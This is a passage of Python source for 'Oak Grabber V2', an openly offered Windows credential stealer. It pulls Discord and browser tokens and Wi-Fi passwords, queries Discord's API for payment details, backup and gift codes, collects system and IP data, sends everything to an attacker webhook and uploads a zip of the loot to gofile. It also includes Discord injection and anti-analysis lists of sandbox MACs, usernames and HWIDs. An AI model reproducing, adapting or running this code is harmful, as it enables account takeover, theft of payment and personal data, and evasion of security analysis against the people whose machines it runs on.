                                    with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
                                        indexFile.write(f)
                                    for proc in psutil.process_iter():
                                        if proc.name() == "Discord.exe":
                                            try:
                                                proc.kill()
                                            except:
                                                pass

    def grabMinecraftCache(self):
        if not os.path.exists(os.path.join(self.roaming, '.minecraft')):
            return
        minecraft = os.path.join(self.dir, 'Minecraft Cache')
        os.makedirs(minecraft, exist_ok=True)
        mc = os.path.join(self.roaming, '.minecraft')
        to_grab = ['launcher_accounts.json', 'launcher_profiles.json',
                   'usercache.json', 'launcher_log.txt']

        for _file in to_grab:
            if os.path.exists(os.path.join(mc, _file)):
                shutil.copy2(os.path.join(mc, _file),
                             minecraft + os.sep + _file)

    def token(self):
        self.grabtokens()
        self.discordinfo()

    def grabtokens(self):
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable',
            'Amigo': self.appdata + r'\\Amigo\\User Data',
            'Torch': self.appdata + r'\\Torch\\User Data',
            'Kometa': self.appdata + r'\\Kometa\\User Data',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\<PROFILE>',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\<PROFILE>',
            'Chrome Beta': self.appdata + r'\\Google\\Chrome Beta\\User Data\\<PROFILE>',
            'Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\<PROFILE>',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\<PROFILE>',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\<PROFILE>',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\<PROFILE>',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\<PROFILE>',
            'Chromium': self.appdata + r'\\Chromium\\User Data\\<PROFILE>'
        }
        for source, path in paths.items():
            if not os.path.exists(path.replace('<PROFILE>', '')):
                continue
            if "discord" not in path:
                profiles = ['Default']
                for dir in os.listdir(path.replace('<PROFILE>', '')):
                    if dir.startswith('Profile '):
                        profiles.append(dir)
                for profile in profiles:
                    newpath = path.replace(
                        '<PROFILE>', profile) + r'\\Local Storage\\leveldb\\'
                    for file_name in os.listdir(newpath):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{newpath}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}", line):
                                self.checkToken(token)
            else:
                if os.path.exists(self.roaming+'\\discord\\Local State'):
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[
                                                         1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
                                self.checkToken(token)
                            if config.get('inject'):
                                Thread(target=self.injector).start()
                            try:
                                os.remove(path+f"{file_name}")
                            except:
                                pass
        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line):
                            self.checkToken(token)

    def grabwifi(self):
        t = ""
        data = subprocess.check_output(
            ['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1]
                    for i in data if "All User Profile" in i]
        for i in profiles:
            results = subprocess.check_output(
                ['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('Windows-1252').split('\n')
            results = [b.split(":")[1][1:-1]
                       for b in results if "Key Content" in b]
            try:
                t += ("{:<30}| {:<}\n".format(i, results[0]))
            except IndexError:
                t += ("{:<30}| {:<}]\n".format(i, ""))
            with open(self.dir+"\\Wifi passwords.txt","w") as f:
                f.write(f"Oak Grabber V2 wifi passwords\n\nWi-Fi Name                    | Password\n------------------------------------------\n")
            with open(self.dir+"\\Wifi passwords.txt", 'a') as f:
                f.write(f"{t}")

    def epicgames(self):
        epic = self.appdata + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini"
        if os.path.exists(epic):
            with open(epic, "r") as f:
                for line in f.readlines():
                    if line.startswith("Data="):
                        with open(os.path.join(self.dir, "Epic games data.txt"), 'w', encoding="cp437") as g:
                            g.write(
                                f"Oak grabber V2 Epic Games Offline Data\n\n")
                            g.write(line.split('Data=')[1].strip())
        else:
            pass

    def discordinfo(self):
        info = f""
        username = []
        tokens = ""
        for tkn in self.tokens:
            tokens += f'{tkn}\n\n'
        try:
            for token in self.tokens:
                languages = {
                    'da': 'Danish, Denmark',
                    'de': 'German, Germany',
                    'en-GB': 'English, United Kingdom',
                    'en-US': 'English, United States',
                    'es-ES': 'Spanish, Spain',
                    'fr': 'French, France',
                    'hr': 'Croatian, Croatia',
                    'lt': 'Lithuanian, Lithuania',
                    'hu': 'Hungarian, Hungary',
                    'nl': 'Dutch, Netherlands',
                    'no': 'Norwegian, Norway',
                    'pl': 'Polish, Poland',
                    'pt-BR': 'Portuguese, Brazilian, Brazil',
                    'ro': 'Romanian, Romania',
                    'fi': 'Finnish, Finland',
                    'sv-SE': 'Swedish, Sweden',
                    'vi': 'Vietnamese, Vietnam',
                    'tr': 'Turkish, Turkey',
                    'cs': 'Czech, Czechia, Czech Republic',
                    'el': 'Greek, Greece',
                    'bg': 'Bulgarian, Bulgaria',
                    'ru': 'Russian, Russia',
                    'uk': 'Ukranian, Ukraine',
                    'th': 'Thai, Thailand',
                    'zh-CN': 'Chinese, China',
                    'ja': 'Japanese',
                    'zh-TW': 'Chinese, Taiwan',
                    'ko': 'Korean, Korea'
                }
                cc_digits = {
                    f'american express': '3',
                    f'visa': '4',
                    f'mastercard': '5'
                }
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                           'Content-Type': 'application/json',
                           'Authorization': token}
                try:
                    res = requests.get(
                        'https://discordapp.com/api/v6/users/@me', headers=headers)
                except Exception as f:
                    self.exceptions.append(traceback.format_exc())
                    pass
                if res.status_code == 200:
                    res_json = res.json()
                    user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                    if not user_name in username:
                        username.append(user_name)
                        user_id = res_json['id']
                        avatar_id = res_json['avatar']
                        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif" if requests.get(
                            f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.png"
                        phone_number = res_json['phone']
                        email = res_json['email']
                        mfa_enabled = res_json['mfa_enabled']
                        flags = res_json['flags']
                        locale = res_json['locale']
                        verified = res_json['verified']

                        language = languages.get(locale)
                        from datetime import datetime
                        creation_date = datetime.utcfromtimestamp(
                            ((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
                        has_nitro = False
                        res = requests.get(
                            'https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)

                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[
                                                   0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[
                                                   0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        billing_info = []

                        for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json():
                            yy = x['billing_address']
                            name = yy['name']
                            address_1 = yy['line_1']
                            address_2 = yy['line_2']
                            city = yy['city']
                            postal_code = yy['postal_code']
                            state = yy['state']
                            country = yy['country']

                            if x['type'] == 1:
                                cc_brand = x['brand']
                                cc_first = cc_digits.get(cc_brand)
                                cc_last = x['last_4']
                                cc_month = str(x['expires_month'])
                                cc_year = str(x['expires_year'])

                                data = {
                                    f'Payment Type': 'Credit Card',
                                    f'Valid': not x['invalid'],
                                    f'CC Holder Name ': name,
                                    f'CC Brand': cc_brand.title(),
                                    f'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                                    f'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                                    f'Address 1': address_1,
                                    f'Address 2': address_2 if address_2 else '',
                                    f'City': city,
                                    f'Postal Code': postal_code,
                                    f'State': state if state else '',
                                    f'Country': country,
                                    f'Default Payment Method': x['default']
                                }

                            elif x['type'] == 2:
                                data = {
                                    f'Payment Type': 'PayPal',
                                    f'Valid': not x['invalid'],
                                    f'PayPal Name': name,
                                    f'PayPal Email': x['email'],
                                    f'Address 1': address_1,
                                    f'Address 2': address_2 if address_2 else '',
                                    f'City': city,
                                    f'Postal Code': postal_code,
                                    f'State': state if state else '',
                                    f'Country': country,
                                    f'Default Payment Method': x['default']
                                }
                        billing_info.append(data)
                        info += f"""\nOak grabber V2 Discordinfo\n\nBasic Information\nUsername: {user_name}\nAvatar id: {avatar_id}\nUser ID: {user_id}\nCreation Date: {creation_date}\nAvatar URL: {avatar_url if avatar_id else ""}\nToken: {token}\n\nNitro: {has_nitro}\n"""
                        if has_nitro:
                            info += (f"Expires in: {days_left} day(s)\n")
                        else:
                            pass

                        info += f"""Phone Number: {phone_number if phone_number else "N/A"}\nEmail: {email if email else ""}\n"""

                        if len(billing_info) > 0:
                            info += (f"\nBilling Information\n")
                            if len(billing_info) == 1:
                                for x in billing_info:
                                    for key, val in x.items():
                                        if not val:
                                            continue
                                        info += ('{:<23}{}{}'.format(key, val, "\n"))

                            else:
                                for i, x in enumerate(billing_info):
                                    title = f'Payment Method {i + 1} ({x["Payment Type"]})'
                                    info += (title+"\n")
                                    info += (('=' * len(title))+"\n")
                                    for j, (key, val) in enumerate(x.items()):
                                        if not val or j == 0:
                                            continue
                                        info += ('        {:<23}{}{}'.format(key, val, "\n"))

                                    if i < len(billing_info) - 1:
                                        info += ('\n')

                            info += ('\n')

                        info += (f"\nAccount Security\n")
                        info += (f"2FA/MFA Enabled: {mfa_enabled}\n")
                        info += (f"Flags: {flags}\n")
                        info += (f"Other:\n")
                        info += (f"Locale: {locale} ({language})\n")
                        info += (f"Email Verified: {verified}\n")
                        g = requests.get(
                            "https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)
                        val_codes = []
                        if "code" in g.text:
                            codes = json.loads(g.text)
                        try:
                            for code in codes:
                                val_codes.append(
                                    (code['code'], code['promotion']['outbound_title']))
                        except TypeError:
                            pass

                        if val_codes == []:
                            info += f'\nNo Gift Cards Found\n'
                            codes = f'\nNo Gift Cards Found\n'
                        else:
                            for c, t in val_codes:
                                codes = ""
                                info += f'\n{t}:\n{c}\n'
                                codes += f'\n{t}:\n{c}\n'
                        path = os.environ["HOMEPATH"]
                        code = '\\Downloads\\discord_backup_codes.txt'
                        info += (f"\n\nDiscord Backup Codes\n\n")
                        if os.path.exists(path + code):
                            with open(path + code, 'r') as g:
                                for line in g.readlines():
                                    if line.startswith("*"):
                                        info += (line)
                                        wfa = ""
                                        wfa += (f"{line}\n")
                        else:
                            info += ("No discord backup codes found")
                            wfa = ("No discord backup codes found")
                        embed = {
                            "username": f"Dc Info | Oak Grabber V2",
                            "avatar_url": "https://i.imgur.com/bbWgtHI.png",
                            "embeds": [
                                {
                                    "author": {
                                        "name": "Wise Oak Tree for life 😎",
                                        "url": "https://github.com/j0taro/Oak-token-Grabber",
                                        "icon_url": "https://i.imgur.com/bbWgtHI.png"
                                    },
                                    "description": f"""**__Tokens__**```{token}\n\n{tokens}```__**Discord Info**__```Username: {user_name}\nUser ID: {user_id}\nToken: {token}\nNitro: {has_nitro}\nPhone Number: {phone_number}\nEmail: {email}\n2FA/MFA Enabled: {mfa_enabled}\n{wfa}```""",
                                    "color": 0x000000,
                                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                                    "thumbnail": {
                                        "url": f"{avatar_url}"
                                    },
                                    "footer": {
                                        "text": "Oak grabber V2",
                                        "icon_url": "https://i.imgur.com/dEiUxyB.png"
                                    },
                                }
                            ]
                        }
                        requests.post(self.webhook, json=embed)
                elif res.status_code == 401:
                    info += (f"Invalid token\n{token}")
                    pass
        except Exception:
            with open("tokens.txt","w") as f:
                for tkn in self.tokens:
                    f.write(f'{tkn}\n')
            self.exceptions.append(traceback.format_exc())
        if info != "":
            with open(f"{self.dir}\\Discord info.txt", "w") as f:
                f.write(str(info))
            requests.post(self.webhook, json=info)

    def sysinfo(self):
        try:
            disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0] + ' GB'
        except Exception:
            disk = "N/A"
            self.exceptions.append(traceback.format_exc())
        try:
            ee = struct.calcsize("P")*8
        except Exception as f:
            ee = "N/A"
            self.exceptions.append(traceback.format_exc())
        try:
            ram = str(psutil.virtual_memory()[0] / 1024 ** 3 + 1).split(".")[0]
        except Exception as f:
            ram = "N/A"
            self.exceptions.append(traceback.format_exc())
        try:
            path = os.getcwd()
        except Exception as f:
            path = "N/A"
            self.exceptions.append(traceback.format_exc())
        try:
            windowskey = self.sys(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault")
        except Exception as f:
            windowskey = "N/A"
            self.exceptions.append(traceback.format_exc())
        try:
            platform = self.sys(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName")
            if sys.getwindowsversion().build > 20000:
                platform = platform.replace("10", "11")
        except Exception as f:
            platform = "N/A"
            self.exceptions.append(traceback.format_exc())
        try:
            hardwareid = self.sys('wmic csproduct get uuid').splitlines()[1]
        except Exception as f:
            hardwareid = "N/A"
            self.exceptions.append(traceback.format_exc())
        try:
            cpu = self.sys('wmic cpu get name').splitlines()[1]
        except Exception as f:
            cpu = 'N/A'
            self.exceptions.append(traceback.format_exc())
        try:
            gpu = self.sys(
                'wmic path win32_VideoController get name').splitlines()[1]
        except Exception as f:
            gpu = 'N/A'
            self.exceptions.append(traceback.format_exc())
        try:
            size = f'{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}'
        except Exception:
            size = 'N/A'
            self.exceptions.append(traceback.format_exc())
        try:
            rr = self.sys(
                'wmic path win32_VideoController get currentrefreshrate').splitlines()[1]
        except Exception as f:
            rr = 'N/A'
            self.exceptions.append(traceback.format_exc())
        try:
            installedapps = '\n'.join(self.sys(
                r'powershell Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* ^| Select-Object DisplayName').splitlines()[3:])
        except Exception:
            installedapps = 'N/A'
            self.exceptions.append(traceback.format_exc())
        try:
            av = ', '.join(self.sys(
                r'wmic /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayname').splitlines()[1:])
        except Exception:
            av = 'N/A'
            self.exceptions.append(traceback.format_exc())
        try:
            battery = psutil.sensors_battery()
            plugged = battery.power_plugged
            percent = str(battery.percent)
            plugged = "Plugged In" if plugged else "Not Plugged In"
            battery = (percent+'% | '+plugged)
        except:
            battery = "N/A (Mostly pc)"
        if rr == "":
            rr = 'N/A'
        try:
            bm = self.sys('wmic bios get manufacturer').splitlines()[1]
        except Exception as f:
            bm = 'N/A'
            self.exceptions.append(traceback.format_exc())
        try:
            mn = self.sys('wmic csproduct get name').splitlines()[1]
        except Exception as f:
            mn = 'N/A'
            self.exceptions.append(traceback.format_exc())
        try:
            ps = self.sys(r'tasklist')
        except Exception as f:
            ps = 'N/A'
            self.exceptions.append(traceback.format_exc())
        name = os.getlogin()
        pc_username = os.getenv("COMPUTERNAME")
        sysinfo = f'''Oak grabber V2 System Info\n\n\nHWID: {hardwareid}\nRAM: {ram}GB\nArchitecture: {ee} bit\nUsername: {pc_username}\nDisk: {disk}\nPlatform: {platform}\nPC-Name: {name}\nWindows key: {windowskey}\nCPU: {cpu}\nGPU: {gpu}\nRefresh rate: {rr}\nModel name: {mn}\nBuild manufacturer: {bm}\nBattery: {battery}\nResolution: {size}\nPath: {path}\n\n\nAntivirus: \n{av}\n\n\nInstalled apps: \n{installedapps}\n\n\nProcesses running\n{ps}'''
        with open(f"{self.dir}\\System info.txt", 'w') as fp:
            fp.write(str(sysinfo))
        try:
            mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        except Exception as f:
            mac = 'N/A'
            self.exceptions.append(traceback.format_exc())
        ip = country = city = region = googlemap = "None"
        try:
            data = requests.get("https://ipinfo.io/json").json()
            ip = data['ip']
            city = data['city']
            country = data['country']
            region = data['region']
            googlemap = "https://www.google.com/maps/search/google+map++" + \
                data['loc']
        except Exception:
            self.exceptions.append(traceback.format_exc())
        embed = {
            "username": f"System Info | Oak Grabber V2",
            "avatar_url": "https://i.imgur.com/bbWgtHI.png",
            "title": "__Oak Grabber V2 System Info__",
            "embeds": [
                     {
                         "author": {
                             "name": "Wise Oak Tree for life 😎",
                             "url": "https://github.com/j0taro/Oak-token-Grabber",
                             "icon_url": "https://i.imgur.com/bbWgtHI.png"
                         },
                         "description": f"""__**System Info**__```HWID: {hardwareid}\nRAM: {ram}GB\nArchitecture: {ee}bit\nUsername: {pc_username}\nDisk: {disk}\nPlatform: {platform}\nBattery: {battery}\nPC-Name: {name}\nWindows key: {windowskey}\nCPU: {cpu}\nGPU: {gpu}\nRefresh rate: {rr}\nModel name: {mn}\nBuild manufacturer: {bm}\nResolution: {size}\nPath: {path}```__**Ip Info**__\n```IP: {ip}\nCity: {city}\nCountry: {country}\nRegion: {region}\nMAC Address: {mac}\nVPN/Proxy: {requests.get("http://ip-api.com/json?fields=proxy").json()["proxy"]}```[Google Maps Location]({googlemap})""",
                         "color": 0x000000,
                         "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                         "footer": {
                             "text": "Oak grabber V2",
                             "icon_url": "https://i.imgur.com/dEiUxyB.png"
                         },
                     }
            ]
        }
        requests.post(self.webhook, json=embed)

    def upload(self):
        name = os.getlogin()
        _zipfile = os.path.join(self.dir, f'OakGrabberV2-{os.getlogin()}.zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(self.dir)
        for dirname, _, files in os.walk(self.dir):
            for filename in files:
                if filename == f'OakGrabberV2-{os.getlogin()}.zip':
                    continue
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()
        self.files, self.fileCount = self.file_tree(self.dir)
        self.fileCount = f"{self.fileCount} File{'s' if self.fileCount != 1 else ''} Found: "
        description = f"""**{self.fileCount}**```{self.files}``````ansi\n\u001b[32mStats:\n\u001b[35mPasswords Found: {self.stats["passwords"]}\nCookies Found: {self.stats["cookies"]}\nPhone Numbers Found: {self.stats["phones"]}\nCards Found: {self.stats["cards"]}\nAddresses Found: {self.stats["addresses"]}\nTokens Found: {self.stats["tokens"]}\nCookies: {self.stats['cookies']}\nBookmarks: {self.stats['bookmarks']}\nRoblox Cookies: {self.stats['roblox cookies']}\nWallets: {self.stats['wallets']}\nPassword Managers: {self.stats['passman']}\nExtentions: {self.stats['extentions']}\nTime: {"{:.2f}".format(time.time() - starttime)}s```"""
        if config.get('Ping_on_run'):
            content = "@everyone"
        else:
            content = ""
        embed = {
            "username": f"{name} | Oak Grabber V2",
            "content": content,
            "avatar_url": "https://i.imgur.com/bbWgtHI.png",
            "title": "__Oak Grabber V2__",
            "embeds": [
                     {
                         "author": {
                             "name": "Wise Oak Tree for life 😎",
                             "url": "https://github.com/j0taro/Oak-token-Grabber",
                             "icon_url": "https://i.imgur.com/bbWgtHI.png"
                         },
                         "description": description,
                         "color": 0x000000,
                         "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                         "footer": {
                             "text": "Oak grabber V2",
                             "icon_url": "https://i.imgur.com/dEiUxyB.png"
                        }
                    }
            ]
        }
        file = {
            "username": f"{name} | Oak Grabber V2",
            "avatar_url": "https://i.imgur.com/bbWgtHI.png"
        }
        if int(len(description)) <= 4096:
            with open(_zipfile, 'rb') as f:
                requests.post(self.webhook, json=embed)
                requests.post(self.webhook, data=file,
                              files={'upload_file': f})
            shutil.rmtree(self.dir)
        else:
            description = f"""{self.fileCount}{self.files}\n\nStats:\nPasswords Found: {self.stats["passwords"]}\nCookies Found: {self.stats["cookies"]}\nPhone Numbers Found: {self.stats["phones"]}\nCards Found: {self.stats["cards"]}\nAddresses Found: {self.stats["addresses"]}\nTokens Found: {self.stats["tokens"]}\nCookies: {self.stats['cookies']}\nBookmarks: {self.stats['bookmarks']}\nRoblox Cookies: {self.stats['roblox cookies']}\nWallets: {self.stats['wallets']}\nPassword Managers: {self.stats['passman']}\nExtentions: {self.stats['extentions']}\nTime: {"{:.2f}".format(time.time() - starttime)}s"""
            with open(self.dir+"\\embed.txt", 'w', encoding='utf-8') as f:
                f.write(description)
            if os.stat(_zipfile).st_size < 8388608:
                with open(_zipfile, 'rb') as f:
                    requests.post(self.webhook, data=file,
                                  files={'upload_file': f})
            else:
                with open(self.dir+"\\embed.txt", 'rb') as f:
                    requests.post(self.webhook, data=file,
                                  files={'upload_file': f})
                shutil.rmtree(self.dir)
                f = requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={
                                  'file': open(_zipfile, 'rb')}).json()["data"]["downloadPage"]
                embed = {
                    "username": f"{name} | Oak Grabber V2",
                    "avatar_url": "https://i.imgur.com/bbWgtHI.png",
                    "title": "__Oak Grabber V2__",
                    "content": content+f" {f}",
                }
                requests.post(self.webhook, json=embed)

# this part was taken from hazard token grabber v2 https://cheataway.com/invite
class AntiDebug(functions):
    inVM = False

    def __init__(self):
        self.processes = list()
        self.Macs = [
            '00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c',
            '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20',
            '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c',
            '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4',
            '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12',
            '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33',
            '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29',
            '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77',
            '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8',
            '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb',
            '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75',
            '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59',
            '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54',
            'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db',
            '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec',
            '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e'
        ]
        self.Users = [
            "WDAGUtilityAccount", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "8Nl0ColNQ5bq",
            "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "HEUeRzl",
        ]
        self.Names = [
            "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM",
            "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4",
            "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH",
        ]
        self.HWIDS = [
            '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', 'DE2937CA-9EBE-42C1-A892-6CD5236911E9',
            '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972',
            '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022',
            '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE',
